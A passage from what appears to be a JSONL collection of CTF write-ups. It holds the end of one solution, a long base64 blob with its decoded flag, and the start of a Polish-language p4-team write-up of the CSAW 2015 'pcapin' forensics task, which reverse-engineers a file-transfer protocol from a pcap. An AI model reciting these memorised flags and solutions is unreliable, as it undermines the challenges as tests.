ZMlJGYTFoV00ydHJWa1JCTVZJeFRuVlhjR3RUVmtaYVZWWkdWbVJUTVZKSFpETnJXR1JqYjFaWldITkhUVVp6Umxad09WZFdibk5aVjIxT2JsZHZXalpXYms1a1ZqTnJZbHBFU2tkVFJrcDJWVzluVjJWSVFsaFdiMlpoVGtaSmVrNVdaMlJTYjNOWldWZGhlbGxXVWxob1IwWlBVbTl6V1ZSdmEwOWtSa3AxWmtodldsWldWV0ZXTUdkTFptOW5WVkZ2WjFkU1ZYTXlWbGN3WVZZeFduZFRibXRzVW05S1dGbFVUa05UTVdkWFdraHpiMUp2VmpOVU1WcHVXVlpLVlZadU9WVldWbHBZVkZSR1YyWXhaM1ZuUjJ0cmFHOWFOVmRYZDFkbU1rcEhWMjluYlZKRldsaFdiVTVEYUc5WllWZHZUbGRXYmpWaVZuQXhjbFJ2VGtoa1JYZFhUWEZDUkZkV1oxSm5NREZXWlVaT2JGSnhRbFZXVjJGdVRrWkpZV1ZJVW0xTk1sSjJWbTFHUzFkdmIxWldjRVpYVWpCellsWnZhM1pXY0VwSFUyNXJXbFp3VWtoYVJscEhWMWRPUjFadloydG9iMXBLVm01YWJXaEhWbmRXY1U1VVpXNXpjbFZ1V21SVlJtOVZVbkZPVGsxWGR6UldNalZQWkRGYWRtWkdaMWRsV0d0alZsUktTMUp3U2tWVWIxWlhaVVp6V1ZaSGQyNVdNVnBYV2toV2ExSlVWbFZWY0dGNmFGWmFXRTFVUW10TlZWcGpWbTlyZWxVeVJuWlRiMmRWVmxkU1ZGVXdXbnBXTVdkM1owWktiRkpVVm1SWFZFSmtWVEZuUjFOeFZsSmtNMUpYVm5CaGVtWnZWV0ZhUm1kdVZtNXpXbGx1V2s5V01WbGpaRVZyVjFZelFsQlZiVVpXYUVkRlkyUkdhMnROY0d0V1ZuQmhVMUl5UmtkWFdHOXVVMGRTVkZsdVdrZE5NVmxpYUVabldHUmpSbUpaTUZKSFdWWmFWMWR4YzFwV1YxSlFXa1puUjFOWFJrZFhjR3RPVjBWS1RsWXhXbE5SY0ZaSVZtOXJWMlF5WVZoWmJtZHlWbFphZFZad1JtMVdiMVl6Vm5BMWJtUkdTblpUYjJ0WFpWaFNkVmx1V21SV2IxcDBWRzlhYkZKdmN6SldSbHBrVWpGYWQxUnVaMVZsUlRWWVdXNXJRazFXV1dGWGIyZFhUVlp2TlZVeU5WZGtiMHBYWmtjNVYwMUdXak5WWTBaa1psWk9kV2RHVGs1U1JWcExWMWQzWkdReFowaFNXRzl1VFRKcmExVndZV1JrUmxwWVRWWm5WMVp1V2pGWmJscGtaRmRLUjJaRmMxZFdSVnBZV1cxS1YxSXhUbmhUYmpWWFpVWnpWMVp0UW1SWlZrNTJaa1phVm1ReVVsVlVWbHBMVWpGdlZscElUbFZsUm5OWldsVmFVMVl4U2xoVWJWSldUVlpXTkZZeFdrdG1NVlozWlVkdlUxZEZTazFXYjJkNlVUSlJlazFJYTFaWFIxSlVXVlJLVTFaV1VsVlRiVkpZWlVaV00xWlhkMjVWTWtwSFprVm5XbVF4V2pOV2JVRmhabFpLZFdSSFJsZG9iMXBKVmtkM1pGUXhaMGRUY1ZaclVuRkNXRnBYTVRSV1JscDFWM0JHVmsxVmJ6UldiMnR1VlRKS2RsTnZWbHBsVkVVd1ZqRmFibGRIVFdOa1JscE9WbFJXV1ZadFNURldNVkoxVFZWblYxZEhVbGhWY0dGTFVURnpWbGR3UmxObFZUVkdWbGN4UjFSdldXRlRibmRYVW05emRWWkVSazluUms1NFZHOVNWMUp2YzFGV1Z6QXhVVEZhZGxaeFNsWmtNRFYyVlcxQ2VsWXhWbmRuUjNkclpVWnpZbGt3VlRWV01rcFpWWEZXWkZaalJsQldiVVpYWm5CT1IxVndiMnhTY1VKNVZtOW5OR1V5VVdKU2NVNXNVMFZ6Y2xSVVNsTldWbFowVkc1T1ZVMVdjMVpWVm10eVZHOWFkV1pFUmxwa01WcE1WbTVhUzFZeFoxVlNiMmRYVWxWellsWlVRbFpvUms1WFUzRk9aRkl5WVU5V2IxcDZWRVphZDJkR1oxcFdiMVkwVmtkM1YxVndSalpTYjFaV1pHNXpWRll4V2xabk1WWjFWSEJ6YkZJeFNsaFhWbFp5VlRGYVYxZHVaMWhrTWxKV1ZuQXhjbEV4YzFaWGJuZHRaVWhDUjFReFozSlViMDVHVTI1M1dGWkZXbGhaYlVwU2FFWmFXVnBHVGxkU1ZYTlZWMVpTVDFVeVRsZG1SbXR1VW5CU1VGVnRSbVJXTVhOR1ZtOW5WMUl3YzBkVWIyWTFWbkJLUjFkeGMxZFNZMFpVVm5CaFpGZFdjMGRYY0dGcmFHOWFUbFl5WVdSV01rMWlVbTluVkZkSFVuSlZiMnREVjBaYWRscEZPVTlXY0ZKV1ZURlNSMWR2V2xWU2JscGFaREZaTUZaVVFXRldNVTVWVW05elYwMHhTbFZXVkVaa1ZURmFkMU51V21SU2IwcFVWbTVXWkZadloxaE5WRUp0VFZWYVlsUldWbVJYUjBWalVXOXJWVlpXV210V1JWcGtWMGRTU1ZSdmExZGtNMEpJVjFkM2JtY3haMGhTV0d0dFVtOUthMVp2V2t0U1JsWjNhRVZ6YmsxRWIwWlZNbUZUVmpGS1ZtUXpaMWhXYjBwTFZHOWFaRkl4Vm5aa1JUbFhWMFZLV0Zad01XTk5WazVYVm5GU2JsTkZOVmxWY0RFMGFGWnZkVlp4VGxkU2NGSktWVmQzZGxkd1NrZFhjWE5WVm05elRGcEdXbnBTY0U1SFZYQnJUbVZGYzFsV2NIZGtWakpGWVZOdloxVmtNbUZ6VlhBMVExWldWblZXYm5OdlVtOXpWbFZYTVVkV01rcElaMFJTVjJWWVVtdFdjREZMWjBkV1NWUnZjMDVTYm5OUlZrZGhaR1F4U25abE0zTnJVak5DV0ZwWFlXUlRNV2QxVlc1S1QxSXhXbGhWTW1GWFZYQkdkVmR3UmxwbFdGSklWRzVhYmxaV1JuZFNiMUpUWkRKNlkxWndNWHBTTVZWaVVsaHZhMUp2V2xkVVZ6VlRaRVphZGxkdlRsZGxTRUpIVlRJeE5GVXhXblptUm05WFpERnphMVpVUmxObU1YTkdWM0JyVTFKdWMxQldiVUp1WlRBMVYxWllaMnRUUlRWeVZtMUJNVmRHV2toTldHZFlaVVp6TVZWWGQzcFdiMXAyWmtaQ1YxSXpUalJaTW1Ga1YxWnpSMVJ3YTA1bFJYTlRWbTVtWVUxSFRXRlViMnRXWkRKcmRGVnZWVEZXVmxwMlZXNW5UbFp2YnpWWk1GWkxWREZhZDA5VVRsZGxXRkY2VmpKMllXWXlUa1pYYjFwT1VtOXVlbGRVUm01VU1sSllVMjVhVDFZelVsaFdjREV6VFZaYVdHaEhkMDVTYm5Nd1ZuQTFWMVV5UldKa1JsSmFWak5TVEZWalJucFhSMUpIVkc5V1UyUXpRbGxXYm1jd1pqSktSMU51V2xoa00xSlhXVzlyVTJadldYcFdWRVp0WlZWelIxbHVaekJXTURGV1prVnZWMVl6UWtSVmJVWmtVakZTZFdWSGMxTldjVUpqVjFjeE1HY3hXblprTTJ0WFpESlNWVlJXV25wVFJscElhRWhPVmsxV2MxcFdWM2R1VmpKRllWZHhjMVpOVjFKWVZtMUtSMU5YU2tkVmIyZHNWbTVXTTFadldtUldNa2w2VGxWclUyVnVjMnRWYjJ0RFZsWmFkMmhJWjA5U2NVSlhWbkExVDFaR1duVm1Sbk5ZWkRGYVRGWlVRV0ZTTVVwMFZHOWFUbFl4U2tsWGJtYzBXVlphZGxkeFJsTmxSVFZ6VlhCaGVtaEdXbFZUYlVKUFVtNDFXRmxVVG01WlZrcFpVVzlXVmsxSFVUQldNVnBYWm05YWQwOVdTbXhTY1VKSVZtMUtNR1l4V2tkVFdITldaRzlhV0ZadVZtUm1iMWw2VjI0NWJVMVZOV0paTUZwdVZqRmFkV1pGWVZkV2IzTjBWRlphVDJZeFduaFViMVpyVFRGS1ZWZFhNREZSTURWSFprWmFXbWh2V2xCV2NERXdUVEZuZFdSSFJsZGxWVmt5Vlc5cmNsWndTbGxrUm10V1pWaE9ORlZ3WVc1bWNFNUhXa1UxYTAwd1NrVldiMUpEWkRGUllsSnZaMVZsUmxwVldWaHpWMlp2V25aVmJrNVBaVWRTVmxWWE5XNWxSbHAxVGxWeldtUXhjMFJXVkVaTFYwZEdSazlXWjA1V2IzTXhWMjVTUjJkd1ZrZFZjVlpYWlVaemNsUlhOVkpvYjFwWWFFZEdWRTFFUmxoWmJtdExWMGRGWTJSSVRsZGxXR3N6Vkc5YWVsWXlSa1phUm5OWFpETkNObFpYTVhwV01WcDJWMjluV0dRemEydFZjR0Y2Wm05elZsZHZaMjVTYjBwaldUQmFVMVV3TVVkbVJXdFhaVWRSZWxkV1ZURlNNVnAwVjI5V2EwMXZTbGxXVjNOQ1RWZE9SMVpZYTFaa01EVlZWbTFDWkUxR1VuWlhiMDVXWlVaelkxWXlNWEpXTVZwMlprWkNWbWh1V2xCYVJtZExVbTluZDFKd2EwNWxjR3RNVmpKM1pGbFhSV0ZVV0d0c1VtOXpUMVZ1Vmt0bVJtOVZVMjFTVWsxV1NsZFdjR0Z1VmtaS2RtWklhMVpsV0ZGNlZuQXhSMDV2U25abFJtZFRaVWhDVVZaWE1HRlRNazUyWlROelpGSnZjMDlWTUZaTFUwWmFXR1pGWjFWTlZuTklWa2RoVjFWd1NsbFJjR3RXWlVkU1VGUnVXbVJTTVZaMldrWk9UbEpGV1hwWGJsWlhUa1phU0ZOeFZsSldSVnBZVlc1V1MxWXhjMFZTY1VwdlpWVTFSMWx1VlRGVk1VbGpaRVp6VjFaalJUQlZNakZYVWpGbmVGWnZVbXROY1d0aFZuQmhVMll4VFdGbVJscHJVbkJTY2xsdVZucFNNVzkxVm5GblZVMVdjMWhXY0hOUFZsVXhXRlZ2VWxabFdHdFlXa1puUzFORk1WZFZiMnRUVFhCUlkxWXhXbE5STVZsaFZIRlNWbVZIWVZoWlZFNURWakZTVlZGd1JtNWxSbHBqV1ZWbU5WUnZXWHBYY1c5YVZrVTFkVlp1V2xwbk1XZDFaVVphVGxZeWF6WldjSE5MVkRGbldGSnVaMVpsUmtwVVZuQmhkV2hHV2xkWGIxcFBWbTQxWTFsdVduWmtWa2xpYUVaV1YyUXhXak5XUkVaa1ptOW5lRnBHV2s1U1JWcFlWa1phVjFsV1VuWlhiMmRZWlc5S1YxUldXa3RUUm05WWFFaEtiazFXV21KWmJscDZWRzlaWWxvemExZGxSa3BEV2tSS1VtaEdUbGxhUjBaVFpEQnpVVmRXVWtkWGJqRjJWMjlXVTJWSFVsUldjSFpoVG05V2QyaEhkMnRXTUhOSVZqSTFSMVl3TVZkWGIyZGtWbFp6WkZwWE1VZFNiMXAyVlc5blRsTkZTVEJXTVdaaFRrWlJlazFXWjFoa01YTlpXVlJPVTFaR1duWmFSemxUVFZoQ1dWUnZWbTVrUmtsNlRsWnpXbFpXV210V2JVcExabTlPZGxadldsZGxWMnRaVmxkelIxbFdaMGRWY1U1clVtNDFjbFJYWVV0V2IxcDJWVzVPVmsxVk5WaFdWMkZrWkZaT1IxZHZaMXBsV0d0clZtOWFkbWRGTlZsYVJUVlhaRE5CWVZaWE1ERlZNVloyVjI5clZtUXlVbXRXYlU1eVZVWlpZbWhHVGxkTlZrcGlWakpoWkZSdlowWlRiMmRZWkRGemExcEVSa3RuUmxwMldrWldhMDB5YTFaV2NIZFhVekpXUjJWR2EyNVNNRnBWVlhCaFMxZEdXa2huU0U1WFVtNDFTVnBWVm5aV2NFWjFWMjVoV21WWWEwdGFSRVo2VW5CS1NHWkdaMnhUUlVZMFZuQmhVMVF4U1dKVmIyZFZaREpoYTFWd1lVdFhSbEpWVVhGblZFMVdXbU5YYm10dVpVWktkbVpGYTFkU1kwWjVXVlpuUzFKd1RrWlViMmRyVFZaek1sWlVSbFpPVmxwMVQxWmFUbFp2U25OWlZFWjZVa1phVlZKd09XeE5ialZpVkZaclMxWndSV05SYjFwWFpYRkNXRlJXV25wWFJUVlhXa1pyVTJRelFsaFhWRUpUVWpGYWRVMVZhMVZrYmpWWVZXOW5VMDB4Vm5SU2JqbFlWakJ6U0ZaWFlVOWtWa3AyWmtoclYxZElRbEJWWTBaV2FGWldkVlp2V214bFYydFlWMVpTUzAwd01YWldXR2RXWkdOdlZGbHVXblpOTVZsaWFFVTViRkp2YzFwVlYzWXhWbTR4U0ZWdlFsZFdWbk5RVm0xR1QyWldTblptUlRWVFpETkNURlp1V21SWlZsRmhaVVpuV0dReWEzUlVWRXBUVmtaYWQyZElXbTVOVjJGV1ZWYzFUMVF4U25WT1ZtdGFWbGRyZFZadFJtUldNV2QwVW05YVRsWnhRazFXY0hka1ZERmFkbGR4U201U2IxcFlWbTVuTTAxR1duZG5SMFpWVFZWdk5WWkhOVmRrVmtwVlZtOXJWVlp3YTBSVk1tRlRWakZhVlZadlVrNWxSbk5ZVjFkM2JtWXhXa2hUYjFwWVZrVmFXRmxYZDB0b2IzTkdWMjQ1V0ZadmMySlhibHBrWkVkRllXWkdRbGRXTTJ0VVZWUkJNVll5U2tsVGNFWk9UVzlLVjFad1lXNWxNVXAyVm0xYVUyUmpiMWhaYmxaNmFGWnZWbFp4VGxWbFJuTllWakZTUTFkSFJuVlRjVXBXVFhGT05GVXhaMGRUVms1MlZHOU9WMDB5YTFGV2NEQjZaekF4Vms1WVRsUmxSMnR5Vlc5YWVsWkdVbGRXVkVaWVZtOWFNVmt3Vms5VWIxcDNhRVpyV2sxR1dtTlpWRVprWmpKT1NHUkdXazVsYjBwWlZtNWFaRlV4U25kU2JsWlRaVVp6VDFsWE1XTm5NVnAxVjNCM1UwMVdTbU5XY0dGa1pGWktSbGR2VWxwa01YTnJXVEZhWkZJeFduWmFSbEpYVFVSV1dWWnVaekJXTVZwSFUyOVdVMlF5YTFoVmNHRjZWVEZTVjFaVVJsZGxSMUpqVm5CaFQxVXhTbGRtUld0WVZqTnJWMVJ2V21SU01WSjJWbTlLYkdReGMzcFdWMkZ1WkRBMVIxZHVaMVpsUlRWVVZGWmFaRTFXYjNWWGNXZFdUVzV6TVZWWGMxTlpWbHBYVjNGdlpGSkZXbFJWTUdkUFUxZEtTR2hHWjFkTk1tdGFWbkJ6UzAxSFRXSldibXRVWlVaeldGbFhZV1JYUm05MlpFWk9VazFXV1RKV1J6VlBWakpLUm1WalNsZFNNMUpyV1ZablMxTldSblZvUm5OWFVsWnpVVlpYTUdGV01VNVlVMjVyVGxZelFsaFpWRWswYUVaYVdFMVVVbTVOVlRWSVZrZGhibFpYU25aWGIxWlhaVlJXUkZwV1dsZG1NVnAzWjBaV1RtUXhXV05YVjNkWFpqSkdkbE5ZYzFaa1kyOVlWbTFPY2xWR1VsZFhiamxYWlZVMVJsVndZV1JXTVZwMlprVXhXRlpGV25WWFZscFBabTR4Vm1SSGMxUlNWbk5oVmxkM1ZrMVdVV0ZYY1VwWFpWVmFWMVJWVWtkV01XOVdWbkJHYkZKdmMxZFdiMnR5VjI0eFYxZHhXbFpOY1d0aldUSmhlV2h2YzBobVJtZHNWakpyVFZadlVrZFpWMFZpVlc1clZXVnVjM0pWYmxwa1ZtOVNWbHBFVWxkU2IzTklWakl3TlZVeFduVk9WVnBXWlZocldGWnVXbVJtYjJkMlZtOWFhMlF3YzNKV1ZFSmtWVEpTU0ZWdVdtNVNiMHBQVkZjMWNsZFdaMVZTY0VaVlRWVTFZMVl5TlZOVU1WcEhVMjlTVjJReFdreFZiVVpXYUZVMVdWUnZVbE5rTTBKSVYxWldVMVV5UmxkVGIxcFlaRE5TYTFWd1lYcE5NV2RYV2taS2JrMXVjMGRaYmxwVFpGZEtkVk5VUWxkbFdFSlFWVlJHVm1oR1VuWmtSbHByYUc5YVdWWndZV1JaVmxwSFYxaHZiVkpYVWxOWmJscDZVMjlWWW1aR1oxWk5WbTgyVlZkM01GWnVNVWhrU0hOWFRVZFNVRnBHWjBkVFYwWkhXa1puVjJWdVNrMVdjSGRrVlRGRllWTllhMVZrTW10clZXOW5VMlpXV25aYVJ6bFBVbTl6TUZwRlZqQldSMHBIWlVSYVYyVllVak5XYm1kTFpqRm5WVkZ2YzA1bGIwb3lWMjlXWkZOd1VXRldiMjlrVWpOcldGWndOVU5UYjFwVlVtOWFiMUl4U2xoV1IyRnVWakpLUmxOdU9WWmxSbk5rVkZaYVZtaEdXbmRuUmxKWFpHTkZNbFp3TUdGTlIwWllVMjVuVkdSamIxaFVWVnBrWjFaelYxcEZXbTVOYjFwSFYyNWFUMVJ2V2xWUmJWWllWa1ZhVkZWVVJsTm1Na3BKVTI5YWEwMHhTbEZXY0RGalRWWlJZVlZ2YTA5V2NGSlZWWEIzZGs1R1dsaE5XR2RXWkdOR1JsVndZVk5YYmpGWFpraEtaRlp3VWxoV01GcFRaakZhZGxWdlRsZE5NbXRrVm01YWJrMUdXV0ZVV0c5VlpVZHJWVmx3TVhKV01XOTJWbFJHV0ZKdldtRlZWelZQVmtkS1IyWkdhMXBOUm5OVVZsZGhXbWh3UmtaYVIwWlhaVVp6TmxaSGQyNVRjRlozVW01YWJGSXlhM0phVjNka1ZqRmFTR2hIYzA1V2IwcGlWRlpXY21ReFRrZFRiMUpYVFVkU2VGUldXbnBXYjFwNFdrWm5WMlZHV1RCV2JVb3daakZTZDFKdFdsTmxSbk5YV1c5clExUkdWblpXV0d0WFpWWmFSMWx1WjBkVWIwcDRVVlJDVjFkSVFsQlpZMFp1VTBaU2VGVnZUbXhsVjJ0WlZsZGhiazVHV1dGWGJsWlVaVzQxVkZsdVZURlRWbWQxV1ROclYxSnVjMGRaTUZwWFZqSktXVlZ3YTFaTmNXdFVWbTFLVDFOR1NuWmFSbEpUWlVoQ1UxWnZaelJsTWsxaFUzRlNVMlZ1YzFsV01HZFRabFphZDJoSFJsUldjR0ZqVm5CaGJtUXhXblZtU0d0V1pWUkdTRlpIWVV0WFYwWkdaa1pyYTJRelFrMVdWRW8wVmpKU1YxZHhVbXRTTW1GelZXOWFlbFZHV2toblJscHVUVzlhV0ZVeVlYWmtiMDVJYUVaclZrMUdXbXRWVkVaWFowZFdSMVJ2WjFObFZrcFlWa1phWkZVeFZXRlhjVTVVWkc1YWExWndZV1JUUmxsaWFFVjNWMlZWV2tsWk1GcFBWRzlLZFdaRk1WZGxSa3BJV1dOR1QxWXlTa2RYYjJkc1VtOXpWVlp3ZDFkWlZUVkhWbGhuVjJWSFVsQldjSFl4VjFaVlltZEhPVmRTYm5OWldsVm1OVmR1TVhSV2NWcGFaVmhyYTFadFNrOVNNVloyVTI5bmJGSlhPR0ZXTW1GWFpUSk5ZVnBGWjFWbFIyRnpWVzFPUTFaR1VsVlJjVnBPVW5CU1lWVndNRFZXVjBZMlVXMU9WVTFYYTFSWlZ6RkxVbkJKWTJSR1oydGtNSEpqVm05U1IxVXhXV0ZhU0VwVlpVWktUMVp2VWxab1JscFZVbkJHVkUxV2MwaFdSMkZrVmpKR2RsTnhSbGRsUmxWaFZWUkdWbWN5UmtoUFYzTlhaVVZ6UjFadVp6QlRNa1pZVWxoclYyUnVOVlpVVmxwa2FHOVdkMDFXWjI1V2JuTmpWbGN4ZGxSdU1YZGtSa0pYWlZoQ1JGa3lNVmRXTVZaMlpVWm5hMDF4YTJ0V2NHRmtXVlpTZGxaeFNsZGxWRzlRVm5CaFIwNXZWbGRrUnpsWVpHTkdZbFl5YzBkV01WbzJVbGhuVjJReVVreFpZMFpQWm5CT1JrNVdUbGRsYmtwTFZuQjNVMUV5UldGVWNVcE9WbGRyZEZVd1ZtUm1WbTkzVFZjNVYxWnZjMkpXY0RWUFZrVXhkbE52YTFwTlJscHJWa2RoU21oV1ZuaFZiMXBYWlVaek1sZFdaelJUTWxKR1QxWm5WR1ZHV2xoWldITlhVMVpuZGxad1JsVk5Wa3BJVlRKaGRsbFdTblZUY0VaYVZrVnlNRlp1V2xab1JtZDNVbTlXYkZKdmNucFdNbmRrWmpGYVIxUnVhMVpsUmxwWFZGYzFVMDB4VW5WYVJtZFlWakJhU2xsVldsTldSa3AyWmtoclYxWXpVbGhaWTBaUFpqRmFXV1ZGT1ZkWFJVcFVWbkExZWxZd05VZFZiMnRQVmxaelQxbHVWVEZvYjFWaVRsYzVWMDFFUmtsV1YzWmhWMjR4VjJaSGEyUlNjRkpZVlhCaFpGZFdjMGRVYjJkWVVsVnpORlp0Um01TlIwbGlVbTVyVldReWEzUlZNRnBrVmpGdldXWkZTbTlTYjFvd1ZHOXJUMVZ3U2taT1dHOWFUVVpLV0ZaWFlXUldWMHBGVkc5YVRsSnZXVEJXVkVvMFZURlpZVlp2VmxOa1kyOVVWbkExUTFaV1drZFhiMmRQVW01elkxWndOVmRXTWtwMVYyOVNWbVZIVVRCWk1WcFdhRVphV1dSR1oxZFdSMkZYVm05blkwMVdVblZOV0VwUFZqQmFWMWx2YTFObWIxcEZVMjVhYmsxWFVtSmFWV2MwVmpKS1YxTlVSbGROVm5OWVZuQjJZVkl4VG5oVWIwNXJUVmhDVUZaWFlXUlpWazVYVjI5V1UyVllVbFZXY0RFMFYyOWFkMmhIZDFaTmJsWTFXbFZXTUZZeVJXRlhiMmRrVWtWYVVGWndNVWRTYjJkM2FFWm5iRlp1Y3pOV2IyWjZUVmRKWVZSeFRtUlNjR3RSVm5CaGVsWkdXblZYY1dkVVVtOXpXVlJXVWtOa01VcDFaa1p6V2xaWFRXRldNakZMWm05T2RXWkdaMU5sVmtwSlZsZHpSMWxXV25aWGNVNVhaVVpLV0ZZd1ZrdFNNVnBIVjI5blYyVldXa2hXTVd0eVYwZEtkMlJHVmxabFJrcElWakJhVm1jeFZuVlBWMkZUWlVoQ1NWZFhjMDlrTWtwSFYzRlNiMUpYVWxkWlYzZEdUVlpTZFZkdVoxZGxWWE5KV1c1bmNtUldUa1pUYmpGWFZqTnJWRlp0Umtwbk1ERlpWWEJ6VGsxdlNsVlhWM2RYWjNCUllWVnhUbGRsV0VKMldXOWFaRmRHWjNWV2NXZFZaVlZhWTFZeGEzSldjRXBaVVc1clYwMUdWalJaTW1Ga1pqRlNkMmhHWjFkU00ydElWbTlTUTFZd05VaFZibWRWWkRGYVUxbFVRbnBWUmxwMlYzRmFiMlZHYzFaVlYzWTFWVEpLUm1WRVRsVmxSMnRNVm01YWJsTldSblpXYjJkT1VtOXpNVmR2Vm1SWGNGWkhWbkZLWkZKdmMzTlpiMnR5VjFaYVdFMUVSbTVOYjFwSlZsWnJlbFZ2WjBsUmNVcFhaVVp6TTFVd1dtUm1NVnA0Vkc5blUyUXpRbGRXVm1jMFZUSkdSazFWYjFKV1JWcFlXVmQzZWxSR1ZsaE5WbWRVVW05S01GbFZaM3BWTWtWalVXMUdWMlZZUWtoYVJFWk9hRlpLV1dSR1dtdE5NVXBqVmxSQ1pGWXdNR0ZXV0d0WVpVVTFXRlZ3ZGpGWFZsSjJWM0JHYTJWR2MwaFdNbmQ2V1ZaWlkxVnZhMVZsV0d0VVZYQXhUMUpXVm5WT1ZtZFhUVEpPTkZadFJsTlNNa1ZpVm05clYyUXlVbFpaYm1keVZsWlZlbVJGU205U2NVSlhWbkJoYmxaRk1WaG5SRlpYVFhGU1kxWkhkbUZtYmpWWFpFWmFhMlF3YzJKV1Z6RmpUVmRPZDFOdVoxaGxSVFZZVkZSS2NsTkdaM1pXY0RsWFRWVTFTRlV5ZDFkVmNFVmpVWEZPV2xaRmNucFVibHAxYUVabmQyZEdjMWRXUlZwWlYxUkNjbFV4VldGWGJWcFRaVVZhVjFsWGQwdE5NVnBWVW05T1ZGSXdOVXBXY0dGa1ZqRmFkbVpHV2xka2JuSXdWbTFHVjFJeFRsbGFSbXRzVWxoQ1dGWkdaelJuTVUxaFprWm5aRkpVYjFWV2JVRXhVMFphU0dkRmQydFdNRmt5VlZkelYxbFdTblptUld0V1pWaHJVRlp0Um5wU1ZsWjJVMjluVjAxd2FqRldjREJoVFVkRllWUnZaMVZsUjFKWVdXOVdaRlpXVWxobU0ydFBaVVpXTlZSdmEwOVhSa3AzYUVSQ1ZVMVdTbFJXYmxwa1pqSk9SVlp3UmxkV01tdEpWbTFDYmxNeVVsZG1SRnBXWkdOV1ZGWndZWFZuTVZsaVRsaG5XbFp1TldOV1IzZGtWRzlaWTFGeFJscGxWRVo1Vkc1YVpHWXhXblpYY0dGVFpERnpXRlp1WnpCa01WVjZUVlZXYkZKVk5WZFVWelZ5VjBaU2RsZHZjMjlsUlRVd1dWVmFUMVl5U2tsUmNEbFlaVVp6ZVZWdFNrcG9WbEo0Vkc5YWJHVlhhMk5XVnpWNlZtNHhSMVp4VGxobFdGSjFXVzVhWkZZeGIzVlhiamxXVFc1elYxWXlOVWRXTVVwWFYxUkNWazF4YTB4V2NERlRVMVpuZDJoR1VsTldjVUpKVm05bU1XY3hVV0ZTY1VwT1UwZHJkRlZ3WVhwWlZsSldaRWM1VlZKeFFsZFpWV3RQVjBaS2RXWkZaMXBXVmxWaFZtNWFUMUp2VG5aWGIxWnNVbkZDVVZaWGMwSm9SMUpJVlc1YWExSXpRbk5aYjJkdVRrWmFWMWR2WjFOTlZuTllWbTlyY2xkSFJXSmtSbFpWVm05VllWWndZV1JTTVc1alpFWm5VMlZXU2t0V1ZFb3daekZhZFUxVmExWmtNbUZXVm05YVpGZEdXV0pvUlRsVFZtNWFNVmxWV21Sa1JURlpVVzlTV0dWR2MxUldSRVpMWjBaV1dWcEdUbXROY0d0VlYxWm5NRk14VFdGYVJtZFhWMGRyV0Zad01UQk9SbGxpVFZWblYxSXdjMWxXUjNOUFZuQktSMlpGWVZWbFJuTXpXVEl4UzFJeFduWlhialZUVFRKclVWWnVXbE5SY0ZaSFYzRk9WV1F4YzNKVmNHRkxWa1pTVm1SSE9WVlNjVUpYVmxkM2JsWkhSalpTYm1kYVpERnphMVpVUmt0WFIxWkZWVzluYTJRd2N6RlhibEpIVm5CV1YxZHhTbGhsUmtwVVZGZGhTMmN4V2xWUmNIZFRUVzlHTlZWd05VdFhSMHBIWmtaT1YyUXhjMnRWTUZwWFRtOU9kVTlXVW14U1dFSmtWMVpXYlUxV1dXSlRjVXBUWkc0MVYxUldaMU5UUm5ORlVuQkdWMlZGYzFwWk1GcFhWakZLVmxkWWMxZFNjRkY2Vm0xR1QyWXhXbGxrUjBaVVVqRktWbFp3YzBKTlZrNUhWMjVuV0dWRmMzWlZiMUpYVWpGU1ZtUklUbFpsUm5OSFZUSjNORmxXV25abVIydGFUWEZyVEZZeFowdFRSMDVIV2tVMVUxSldjMWRXYjJjMFdWWlJZV1ZHWjFWWFIyRldXVzlyVTFaR1duWmtSVXB2VW05Wk1sVlhOVXRrTURGMlYyOXJWMDF0Vm1OV2JsVmhVbTluZFZSdlowNWxiMFl6VjFabk5GVndVV0ZYY1VaWVpVaENUMWxVVGtOVGIxcFpaa1U1YlUxV2J6UldWMkZ1VlRKS1IxTnZaMXBXUlZvelZtNWFVMVp2Vm5WVWIxSlRaVVp6V1ZadVdsTlRNa1oyVTI5cmExSlViMWhaYjJ0VFpFWlZZVmR2VGxkTlZuTmlWMjVhYmxZeFdraGFNM05YVmpOQ1JGbGpSbTVTTWs1SlZIQnZUazF2U21GV1YzTlBVVEF3WVZkdlZsSmtNbEoxVm5CMk1WWXhibnBWYm1kc1VtNXpXRll5ZDNaV01VcEdaa2RyVmsxR1ZqUlZNV2RMVTBkS1NHVkZOVmRXUmxWNlZuQnpRMlJ1TVZkVVdHOVRWMGRTV1ZsWWMwZFdWbHAyV2tSU2JWSnZWalZhUldZMVZrZEtSMlZFVGxwa01tdFVWbTVhWkdadU5WWmtSbWRzVWpGS1RWZHVWbVJWTVVwM1UyNW5WV1ZYYTNKVVZWSlhVakZhVmxkdlNtNU5WVXBUVlVaUmVsQlJQVDA9'\n    decode(x)\n```\n\nDecoded message and the flag is: `flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}`.", "timestamp": "2025-10-21T22:02:59.129043"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/forensics_150_pcapin/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/forensics_150_pcapin/README.md", "content": "## pcapin (forensics, 150p, 41 solves)\n\n> We have extracted a pcap file from a network where attackers were present. We know they were using some kind of file transfer protocol on TCP port 7179. We're not sure what file or files were transferred and we need you to investigate. We do not believe any strong cryptography was employed.\n> \n> Hint: The file you are looking for is a png\n> pcapin_73c7fb6024b5e6eec22f5a7dcf2f5d82.pcap\n\n### PL Version\n`for ENG version scroll down`\n\nDostajemy [plik .pcap](pcapin.pcap). Jest w nim tylko jeden interesujący stream tcp, więc wyciągamy od razu z niego dane (tylko wysyłane z serwera do klienta, chociaż wygląda na to że klient wysyła dane tym samym protokołem) do [osobnego pliku](rawdata.bin).\n\nW tym momencie rozpoczyna się analiza protokołu. Np. na pierwszy rzut oka widać powtarzający się fragment `00440000073200010000000000` w pierwszej części, a później wariacje na temat `00D423C60732001C00010000`.\n\nOszczędzimy może analizy krok po kroku (bo była długa i burzliwa), ale kluczowe było zauważenie że dane dzielą się na pakiety, i pierwszy word każdego pakietu to długość tego pakietu. Wtedy możemy podzielić odpowiedź na pakiety, i widzimy dodatkowo że odpowiedź kończy sie zawsze bajtami `END`.\n\nZ tą wiedzą dekodujemy wszystkie pakiety po kolei, używamy trochę domyślności i dochodzimy do takiej oto struktury:\n\n    struct packet {\n        uint16_t length;\n        uint16_t hash;\n        uint16_t magic1;\n        uint16_t conn_id;\n        uint16_t seq_id;\n        uint16_t unk2;\n        uint8_t raw[10000];\n    };\n\nNapisaliśmy mały tool do dumpowania zawartości poszczególnych pakietów z tej struktury:\n\n    msm@andromeda /cygdrive/c/Users/msm/Code/RE/CTF/2015-09-16 csaw/forensics_200_pcapin\n    $ ./a.exe\n    PACKET 0\n     - size: 